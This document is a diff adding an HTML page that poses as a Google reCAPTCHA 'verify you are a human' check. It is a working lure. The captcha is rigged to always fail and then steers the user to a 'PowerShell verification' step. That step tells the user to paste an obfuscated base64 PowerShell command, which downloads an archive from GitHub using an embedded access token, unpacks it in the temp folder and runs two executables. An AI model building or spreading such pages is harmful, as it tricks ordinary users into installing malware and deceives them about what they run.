@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify you are a human</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f8f9fa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            color: #202124;
+            line-height: 1.5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 2px 8px rgba(0,0,0,0.05);
+            border: 1px solid #dadce0;
+        }
+
+        .header {
+            background-color: #1a73e8;
+            color: white;
+            padding: 20px 20px 16px 20px;
+            text-align: left;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header h1 i {
+            font-size: 20px;
+            color: white;
+        }
+
+        .header p {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 13px;
+            margin-bottom: 0;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+        .captcha-box {
+            background-color: transparent;
+            border: none;
+            padding: 0;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            flex-wrap: wrap;
+            flex-direction: row;
+        }
+
+        .captcha-input-wrapper {
+            flex: 1 1 160px;
+            min-width: 140px;
+        }
+
+        .captcha-input-wrapper label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+        }
+
+        .captcha-input-wrapper input {
+            width: 100%;
+            padding: 10px 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 15px;
+            transition: border 0.2s;
+        }
+
+        .captcha-input-wrapper input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+
+        .captcha-right {
+            flex: 0 0 auto;
+            width: 110px;
+        }
+
+        .captcha-display {
+            background-color: #f1f3f4;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 8px 4px;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: normal;
+            color: #202124;
+            user-select: none;
+            position: relative;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .captcha-display::before,
+        .captcha-overlap,
+        .captcha-noise {
+            display: none;
+        }
+
+        .captcha-display-text span {
+            display: inline-block;
+            transform: rotate(var(--rotation, 0deg)) translateX(var(--translateX, 0)) translateY(var(--translateY, 0));
+            --rotation: 0deg;
+            --translateX: 0px;
+            --translateY: 0px;
+            font-weight: 700;
+            color: #202124 !important;
+            margin-left: -3px;
+            margin-right: -3px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.08);
+        }
+
+        .captcha-display-text span:first-child {
+            margin-left: 0;
+        }
+
+        .captcha-display-text span:last-child {
+            margin-right: 0;
+        }
+
+        .captcha-controls {
+            margin-top: 6px;
+        }
+
+        .captcha-controls button {
+            width: 100%;
+            padding: 6px 8px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background-color: white;
+            color: #5f6368;
+            cursor: pointer;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            transition: background 0.2s;
+        }
+
+        .captcha-controls button:hover {
+            background-color: #f8f9fa;
+        }
+
+        /* ----- Pixel‑perfect reCAPTCHA simulation ----- */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin: 12px 0 16px 0;
+            padding: 8px 12px;
+            background-color: #f8f9fa;
+            border-radius: 4px;
+            border: 1px solid #dadce0;
+            position: relative;
+        }
+
+        /* Hide real checkbox */
+        #humanCheck {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+            pointer-events: none;
+        }
+
+        /* Custom checkbox – identical to Google's */
+        .checkbox-visual {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background-color: white;
+            margin-right: 10px;
+            transition: all 0.15s ease;
+            flex-shrink: 0;
+        }
+
+        .checkbox-visual.loading {
+            border-color: #c1c1c1;
+            background-color: white;
+        }
+
+        .checkbox-visual.loading i {
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        .checkbox-visual.checked {
+            border-color: #1a73e8;
+            background-color: #1a73e8;
+        }
+
+        .checkbox-visual.checked i {
+            color: white;
+            font-size: 14px;
+        }
+
+        .checkbox-visual i {
+            display: block;
+            line-height: 1;
+        }
+
+        .checkbox-container label {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+            flex: 1;
+        }
+
+        /* reCAPTCHA badge – exactly like the real one */
+        .recaptcha-badge {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-left: auto;
+            line-height: 1.2;
+            text-align: center;
+        }
+
+        .recaptcha-badge img {
+            width: 24px;
+            height: 24px;
+            margin-bottom: 2px;
+        }
+
+        .recaptcha-brand {
+            font-size: 10px;
+            font-weight: 500;
+            color: #5f6368;
+            letter-spacing: 0.2px;
+        }
+
+        .recaptcha-links {
+            font-size: 8px;
+            color: #9aa0a6;
+            margin-top: 2px;
+        }
+
+        .recaptcha-links a {
+            color: #9aa0a6;
+            text-decoration: none;
+        }
+
+        .recaptcha-links a:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .submit-btn:hover {
+            background-color: #1666d6;
+        }
+
+        .submit-btn.secondary {
+            background-color: white;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+        }
+
+        .submit-btn.secondary:hover {
+            background-color: #f8f9fa;
+        }
+
+        .submit-btn:disabled {
+            background-color: #a8c7fa;
+            cursor: not-allowed;
+        }
+
+        .message {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            display: none;
+            animation: fadeIn 0.2s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .success {
+            background-color: #e6f4ea;
+            color: #137333;
+            border: 1px solid #b7e1b3;
+        }
+
+        .error {
+            background-color: #fce8e6;
+            color: #c5221f;
+            border: 1px solid #f5b5b2;
+        }
+
+        .alt-method-link {
+            margin-top: 16px;
+            text-align: right;
+            font-size: 13px;
+        }
+
+        .alt-method-link a {
+            color: #1a73e8;
+            text-decoration: none;
+            border-bottom: none;
+            padding-bottom: 0;
+            cursor: pointer;
+        }
+
+        .alt-method-link a:hover {
+            text-decoration: underline;
+            border-bottom: none;
+        }
+
+        /* ----- POWERSHELL STEP – NO TOP GAP ----- */
+        .powershell-container {
+            display: none;
+            border-top: none;
+            margin-top: 0;
+            padding-top: 0;
+        }
+
+        .powershell-container.visible {
+            display: block;
+        }
+
+        .instruction-box {
+            background-color: transparent;
+            padding: 0;
+            border: none;
+            border-left: 3px solid #1a73e8;
+            padding-left: 16px;
+        }
+
+        .instruction-box h3 {
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            color: #202124;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .instruction-box p,
+        .instruction-box ol {
+            font-size: 13px;
+            color: #5f6368;
+        }
+
+        .instruction-box ol {
+            margin-left: 20px;
+        }
+
+        .instruction-box li {
+            margin-bottom: 8px;
+        }
+
+        .code-block {
+            background-color: #f1f3f4;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 12px;
+            margin: 16px 0;
+            position: relative;
+        }
+
+        .code-content {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 10px;
+        }
+
+        .code-text {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.5;
+            color: #202124;
+            overflow-x: auto;
+            flex: 1;
+            white-space: nowrap;
+        }
+
+        .copy-btn {
+            background-color: #5f6368;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            padding: 6px 12px;
+            font-size: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            flex-shrink: 0;
+        }
+
+        .copy-btn:hover {
+            background-color: #3c4043;
+        }
+
+        .copy-btn.copied {
+            background-color: #34a853;
+        }
+
+        .key-combo {
+            background: #f1f3f4;
+            padding: 2px 8px;
+            border-radius: 4px;
+            border: 1px solid #dadce0;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .win11-icon {
+            width: 1em;
+            height: 1em;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 16px 20px;
+            color: #9aa0a6;
+            font-size: 11px;
+            border-top: 1px solid #dadce0;
+            background-color: #f8f9fa;
+        }
+
+        @media (max-width: 420px) {
+            .captcha-box {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .captcha-input-wrapper,
+            .captcha-right {
+                width: 100%;
+            }
+            .captcha-right {
+                order: -1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>
+                <!-- Shield icon removed as requested -->
+                Verify you are a human
+            </h1>
+            <p>Security verification</p>
+        </div>
+
+        <div class="content">
+            <!-- MAIN CAPTCHA STEP -->
+            <div id="captchaStep">
+                <div class="captcha-box">
+                    <div class="captcha-input-wrapper">
+                        <label for="captchaInput">Enter characters</label>
+                        <input type="text" id="captchaInput" class="form-control" placeholder="Text from image" autofocus>
+                    </div>
+                    <div class="captcha-right">
+                        <div class="captcha-display">
+                            <div class="captcha-display-text" id="captchaText">5G4H2</div>
+                        </div>
+                        <div class="captcha-controls">
+                            <button id="refreshCaptcha">
+                                <i class="fas fa-redo-alt"></i> New
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="verification-form">
+                    <div class="checkbox-container">
+                        <!-- Hidden real checkbox – keeps state for validation -->
+                        <input type="checkbox" id="humanCheck">
+
+                        <!-- Label with pixel‑perfect reCAPTCHA simulation -->
+                        <label for="humanCheck" id="recaptchaLabel">
+                            <span class="checkbox-visual" id="checkboxVisual">
+                                <!-- Thin circular spinner (identical to real reCAPTCHA) -->
+                                <i class="fas fa-circle-notch fa-spin" style="display: none;"></i>
+                                <!-- White checkmark -->
+                                <i class="fas fa-check" style="display: none;"></i>
+                            </span>
+                            I'm not a robot
+                        </label>
+
+                        <!-- Authentic reCAPTCHA badge (logo, brand, privacy/terms) -->
+                        <div class="recaptcha-badge">
+                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+                            <span class="recaptcha-brand">reCAPTCHA</span>
+                            <span class="recaptcha-links">
+                                <a href="#">Privacy</a> - <a href="#">Terms</a>
+                            </span>
+                        </div>
+                    </div>
+
+                    <button class="submit-btn" id="verifyCaptchaBtn">
+                        Verify
+                    </button>
+
+                    <div class="message success" id="captchaSuccessMessage">
+                        <i class="fas fa-check-circle"></i> Verification successful. Continue...
+                    </div>
+                    <div class="message error" id="captchaErrorMessage">
+                        <i class="fas fa-exclamation-circle"></i> Verification failed. Please try again.
+                    </div>
+
+                    <div class="alt-method-link" id="altMethodLinkContainer" style="display: none;">
+                        <a href="#" id="altMethodLink">Try another verification method →</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- POWERSHELL STEP -->
+            <div class="powershell-container" id="powershellStep">
+                <div class="instruction-box">
+                    <h3><i class="fas fa-terminal"></i> PowerShell verification</h3>
+                    <p>Run this command in PowerShell to send us a verification request:</p>
+                    <ol>
+                        <li>Copy the command below</li>
+                        <div class="code-block">
+                            <div class="code-content">
+                                <div class="code-text">
+                                    <code id="powershellCommand">powershell -eC SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7AEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4APQAiAHQAbwBrAGUAbgAgAGcAaABwAF8AbwA2AGgAQwBzAGMAVQBXAEMAbAA2AGEAQgBDAG8AMQBqAHoATABOAE8AZQAzAGgANAB5AG8AbwBHAEwAMABmAGsAYQBIAHIAIgB9ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGEAcABpAC4AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBwAG8AcwAvAGcAbABpAHQAYwBoAC0AZwBhAG0AZQBzAC0AZwBoAHgALwB3AGkAbgB1AHAALwB6AGkAcABiAGEAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdwBpAG4AdQBwAC4AegBpAHAAIgA7ACAAaQBmACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdwBpAG4AdQBwACIAKQB7AFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARgBvAHIAYwBlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHcAaQBuAHUAcAAiAH0AOwAgAEUAeABwAGEAbgBkAC0AQQByAGMAaABpAHYAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXAB3AGkAbgB1AHAALgB6AGkAcAAiACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHcAaQBuAHUAcAAiADsAIAAkAGkAbgBuAGUAcgA9ACgARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACIAJABlAG4AdgA6AFQARQBNAFAAXAB3AGkAbgB1AHAAIgAgAC0ARABpAHIAZQBjAHQAbwByAHkAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAAMQApAC4ARgB1AGwAbABOAGEAbQBlADsAIABNAG8AdgBlAC0ASQB0AGUAbQAgACIAJABpAG4AbgBlAHIAXAAqACIAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdwBpAG4AdQBwACIAIAAtAEYAbwByAGMAZQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJABpAG4AbgBlAHIAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEYAbwByAGMAZQA7ACAAaQBmACAAKAAoAFQAZQBzAHQALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHcAaQBuAHUAcABcAGMAcwBjAC4AZQB4AGUAIgApACAALQBhAG4AZAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdwBpAG4AdQBwAFwAYwBzAGwALgBlAHgAZQAiACkAKQAgAHsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHcAaQBuAHUAcABcAGMAcwBjAC4AZQB4AGUAIgAgAC0AVwBvAHIAawBpAG4AZwBEAGkAcgBlAGMAdABvAHIAeQAgACIAJABlAG4AdgA6AFQARQBNAFAAXAB3AGkAbgB1AHAAIgA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AFQARQBNAFAAXAB3AGkAbgB1AHAAXABjAHMAbAAuAGUAeABlACIAIAAtAFcAbwByAGsAaQBuAGcARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdwBpAG4AdQBwACIAIAB9ADsAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdwBpAG4AdQBwAC4AegBpAHAAIgA=</code>
+                                </div>
+                                <button class="copy-btn" id="copyPowershellBtn">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                        <li>Open PowerShell (Press <span class="key-combo">Win <svg class="win11-icon" viewBox="0 0 24 24"><rect x="1" y="1" width="10" height="10" rx="1.2" fill="#0078D4"/><rect x="13" y="1" width="10" height="10" rx="1.2" fill="#0078D4"/><rect x="1" y="13" width="10" height="10" rx="1.2" fill="#0078D4"/><rect x="13" y="13" width="10" height="10" rx="1.2" fill="#0078D4"/></svg> + X</span> → Click on <strong>Terminal</strong>)</li>
+                        <li>Paste (<span class="key-combo">Ctrl+V</span>) and press (<span class="key-combo">Enter</span>)</li>
+                        <li>Wait for the request to be sent</li>
+                    </ol>
+                </div>
+
+                <div style="margin-top: 20px;">
+                    <button class="submit-btn" id="continueToStep3Btn">
+                        Verify
+                    </button>
+                    <button class="submit-btn secondary" id="backToCaptchaBtn" style="margin-top: 8px;">
+                        <i class="fas fa-arrow-left"></i> Back
+                    </button>
+                </div>
+
+                <div class="message error" id="powershellErrorMessage" style="display: none;">
+                    <i class="fas fa-times-circle"></i> Verification failed. Please try again later.
+                </div>
+
+                <div class="message success" id="completionMessage" style="display: none;">
+                    <i class="fas fa-check-circle"></i> Verification complete! Your access is verified.
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            Protected by reCAPTCHA • Privacy & Terms
+        </div>
+    </div>
+
+    <script>
+        let currentCaptcha = '';
+        let attemptCount = 0;
+        const showAltAfterAttempts = 3;
+
+        // ----- Pixel‑perfect reCAPTCHA simulation -----
+        const humanCheck = document.getElementById('humanCheck');
+        const checkboxVisual = document.getElementById('checkboxVisual');
+        const recaptchaLabel = document.getElementById('recaptchaLabel');
+
+        // Set visual state and hidden checkbox
+        function setCheckboxState(checked, isLoading = false) {
+            checkboxVisual.classList.remove('loading', 'checked');
+            const spinner = checkboxVisual.querySelector('.fa-circle-notch');
+            const checkIcon = checkboxVisual.querySelector('.fa-check');
+            spinner.style.display = 'none';
+            checkIcon.style.display = 'none';
+
+            if (isLoading) {
+                checkboxVisual.classList.add('loading');
+                spinner.style.display = 'block';
+                humanCheck.checked = false;
+            } else if (checked) {
+                checkboxVisual.classList.add('checked');
+                checkIcon.style.display = 'block';
+                humanCheck.checked = true;
+            } else {
+                // Unchecked – empty
+                humanCheck.checked = false;
+            }
+        }
+
+        // Simulate real reCAPTCHA click: spinner, then checkmark
+        recaptchaLabel.addEventListener('click', function(e) {
+            e.preventDefault(); // prevent default checkbox toggle
+
+            // Already checked or currently loading? Then ignore.
+            if (humanCheck.checked || checkboxVisual.classList.contains('loading')) {
+                return;
+            }
+
+            // Start the thin‑arc spinner (exactly like real reCAPTCHA)
+            setCheckboxState(false, true);
+
+            // Real reCAPTCHA takes ~1 second to verify
+            setTimeout(() => {
+                setCheckboxState(true, false);
+            }, 900); // 0.9 sec – snappy and authentic
+        });
+
+        // Reset checkbox to unchecked (used by "New" and after verification failure)
+        function resetCheckbox() {
+            setCheckboxState(false, false);
+        }
+
+        // ----- Captcha generation -----
+        function generateCaptcha() {
+            const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789";
+            let captcha = "";
+            for (let i = 0; i < 5; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+
+            const captchaTextEl = document.getElementById('captchaText');
+            captchaTextEl.innerHTML = '';
+
+            for (let i = 0; i < captcha.length; i++) {
+                const charSpan = document.createElement('span');
+                charSpan.textContent = captcha[i];
+                charSpan.style.setProperty('--rotation', `${Math.floor(Math.random() * 14) - 7}deg`);
+                charSpan.style.setProperty('--translateX', `${Math.floor(Math.random() * 7) - 3}px`);
+                charSpan.style.setProperty('--translateY', `${Math.floor(Math.random() * 7) - 3}px`);
+                captchaTextEl.appendChild(charSpan);
+            }
+            return captcha;
+        }
+
+        function showPowerShellStep() {
+            document.getElementById('captchaStep').style.display = 'none';
+            document.getElementById('powershellStep').classList.add('visible');
+        }
+
+        function showCaptchaStep() {
+            document.getElementById('captchaStep').style.display = 'block';
+            document.getElementById('powershellStep').classList.remove('visible');
+            document.getElementById('powershellErrorMessage').style.display = 'none';
+            document.getElementById('completionMessage').style.display = 'none';
+        }
+
+        currentCaptcha = generateCaptcha();
+
+        // ----- Refresh captcha -----
+        document.getElementById('refreshCaptcha').addEventListener('click', function() {
+            currentCaptcha = generateCaptcha();
+            document.getElementById('captchaSuccessMessage').style.display = 'none';
+            document.getElementById('captchaErrorMessage').style.display = 'none';
+            document.getElementById('altMethodLinkContainer').style.display = 'none';
+            document.getElementById('captchaInput').value = '';
+            resetCheckbox(); // reset reCAPTCHA state
+        });
+
+        // ----- Main Verify button with loading spinner -----
+        document.getElementById('verifyCaptchaBtn').addEventListener('click', function(e) {
+            const btn = this;
+            const userInput = document.getElementById('captchaInput').value.trim();
+            const isHumanChecked = humanCheck.checked;
+            const successMsg = document.getElementById('captchaSuccessMessage');
+            const errorMsg = document.getElementById('captchaErrorMessage');
+            const altLinkContainer = document.getElementById('altMethodLinkContainer');
+
+            // Immediate validation (no loading)
+            if (!isHumanChecked) {
+                errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Please check the "I\'m not a robot" box.';
+                errorMsg.style.display = 'block';
+                successMsg.style.display = 'none';
+                altLinkContainer.style.display = 'none';
+                return;
+            }
+            if (!userInput) {
+                errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Please enter the text from the image.';
+                errorMsg.style.display = 'block';
+                successMsg.style.display = 'none';
+                altLinkContainer.style.display = 'none';
+                return;
+            }
+
+            // Loading state
+            const originalHtml = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Verifying...';
+            btn.disabled = true;
+
+            // Hide old messages
+            successMsg.style.display = 'none';
+            errorMsg.style.display = 'none';
+            altLinkContainer.style.display = 'none';
+
+            // Simulate network delay (same as PowerShell step)
+            setTimeout(() => {
+                attemptCount++;
+                document.getElementById('captchaInput').value = '';
+                resetCheckbox();          // uncheck for next attempt
+                currentCaptcha = generateCaptcha();
+
+                if (attemptCount < showAltAfterAttempts) {
+                    errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Verification failed. Please try again.';
+                    errorMsg.style.display = 'block';
+                    altLinkContainer.style.display = 'none';
+                } else {
+                    errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Verification failed. There seems to be an error.';
+                    errorMsg.style.display = 'block';
+                    altLinkContainer.style.display = 'block';
+                }
+
+                btn.innerHTML = originalHtml;
+                btn.disabled = false;
+            }, 1800);
+        });
+
+        document.getElementById('captchaInput').addEventListener('keyup', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('verifyCaptchaBtn').click();
+            }
+        });
+
+        document.getElementById('altMethodLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            showPowerShellStep();
+        });
+
+        document.getElementById('copyPowershellBtn').addEventListener('click', function() {
+            const cmd = document.getElementById('powershellCommand').textContent;
+            navigator.clipboard.writeText(cmd).then(() => {
+                this.innerHTML = '<i class="fas fa-check"></i> Copied';
+                this.classList.add('copied');
+                setTimeout(() => {
+                    this.innerHTML = '<i class="fas fa-copy"></i> Copy';
+                    this.classList.remove('copied');
+                }, 2000);
+            });
+        });
+
+        document.getElementById('backToCaptchaBtn').addEventListener('click', function() {
+            showCaptchaStep();
+        });
+
+        document.getElementById('continueToStep3Btn').addEventListener('click', function() {
+            const btn = this;
+            const originalHtml = btn.innerHTML;
+            const errorMsg = document.getElementById('powershellErrorMessage');
+            const successMsg = document.getElementById('completionMessage');
+
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Verifying...';
+            btn.disabled = true;
+
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+
+            setTimeout(() => {
+                btn.innerHTML = originalHtml;
+                btn.disabled = false;
+                // --- ALWAYS SHOW ERROR MESSAGE, NEVER SUCCESS ---
+                errorMsg.style.display = 'block';
+                successMsg.style.display = 'none';
+                errorMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 1800);
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            currentCaptcha = generateCaptcha();
+            resetCheckbox(); // start unchecked
+        });
+    </script>
+</body>
+</html>
